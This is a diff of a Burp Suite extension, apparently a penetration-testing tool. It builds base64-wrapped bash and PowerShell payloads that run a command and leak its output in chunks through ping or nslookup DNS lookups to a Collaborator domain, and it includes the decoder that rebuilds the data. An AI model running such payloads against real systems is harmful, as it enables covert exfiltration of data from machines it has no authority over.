@@ -130,12 +130,12 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         return self.tab
 
     def createBashBase64Payload(self, linuxCommand):
-        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";''' + linuxCommand + '''|base64 -w57|sed -r 's/$/E-F/g;s/=/-/g;s/\\+/PLUS/g'|while read j;do ping -c1 "$(printf '%04d' $i).$j.$d";((i++));done'''
+        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";''' + linuxCommand + '''|base64 -w60|sed -r 's/$/E-F/g;s/=/-/g;s/\\+/_/g'|while read j;do ping -c1 "$(printf '%04d' $i).$j.$d";((i++));done'''
         return "echo " + self._helpers.base64Encode(bashCommand) + "|base64 -d|bash"
 
     # Create windows powershell base64 payload
     def createPowershellBase64Payload(self, windowsCommand):
-        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$b+="E-F";$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","-").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
+        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$b+="E-F";$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","-").replace("+","_");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
         return "powershell -enc " + self._helpers.base64Encode(powershellCommand.encode("UTF-16-LE"))
     
     # return generated payload to payload text area
@@ -221,7 +221,7 @@ def showOutput(outputDict):
         if "E-F" in v:
             for chunk in (sorted(outputDict.items())): #Sort by preamble number to put data in order 
                 completedInputString += chunk[1] # DNSrecordDict.items() returns a tuple so take value from the dict and append it to completedInputString.
-    output = completedInputString[:-3].replace('-','=').replace('PLUS','+') # drop EOF marker and replace any - padding with = and fix PLUSes
+    output = completedInputString[:-3].replace('-','=').replace('_','+') # drop EOF marker and replace any - padding with = and fix _s
     try:
       output = base64.b64decode(output)
     except:
